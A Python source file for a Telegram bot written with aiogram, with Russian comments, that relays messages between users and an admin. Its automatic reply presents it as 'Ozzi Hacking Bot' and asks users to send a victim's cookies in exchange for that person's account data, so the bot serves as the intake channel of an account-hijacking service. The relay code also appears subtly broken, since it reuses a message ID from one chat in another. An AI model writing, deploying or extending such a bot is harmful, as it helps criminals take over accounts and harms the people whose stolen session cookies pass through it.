import os
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.types import Message

TOKEN = os.getenv("TOKEN")  # Токен бота
ADMIN_ID = int(os.getenv("ADMIN_ID"))  # Твой Telegram ID (УБЕДИСЬ, ЧТО ЭТО ЧИСЛО!)

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Словарь для хранения соответствия "пользователь → его последнее сообщение"
user_messages = {}

@dp.message()
async def handle_messages(message: Message):
    """Пересылает сообщения админу и позволяет отвечать обратно"""
    user_id = message.from_user.id

    if user_id != ADMIN_ID:  # Если это не ты, значит обычный пользователь
        user_messages[message.message_id] = user_id  # Запоминаем, от кого сообщение
        await bot.send_message(
            ADMIN_ID,
            f"Сообщение от {message.from_user.full_name} (@{message.from_user.username}):\n\n{message.text}",
            reply_to_message_id=message.message_id  # Даёт возможность тебе ответить
        )
        await message.answer("Привет, это Ozzi Hacking Bot! Пришли куки жертвы и мы скоро дадим его данные аккаунт тебе :)")

    else:  # Если это ТЫ (АДМИН) отвечаешь
        if message.reply_to_message and message.reply_to_message.message_id in user_messages:
            target_user = user_messages[message.reply_to_message.message_id]  # Получаем ID пользователя
            await bot.send_message(target_user, f"{message.text}")

async def main():
    """Запуск бота"""
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
